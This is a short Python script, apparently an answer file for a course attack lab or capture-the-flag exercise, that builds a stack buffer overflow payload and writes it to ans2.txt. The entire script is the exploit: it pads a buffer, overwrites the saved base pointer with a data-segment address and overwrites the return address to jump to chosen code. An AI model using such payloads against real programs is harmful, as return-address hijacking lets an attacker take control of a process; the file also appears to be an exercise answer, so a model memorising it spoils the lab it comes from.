import struct

# 生成 payload
payload = b""
payload += b"A" * 8                     # 填充缓冲区
payload += struct.pack("<Q", 0x404050)  # RBP = .data 段地址
payload += struct.pack("<Q", 0x40124c)  # 返回地址 = 目标代码
payload += b"X" * 32                    # 填充剩余空间（共56字节）

# 保存到 ans2.txt
with open("ans2.txt", "wb") as f:
    f.write(payload)

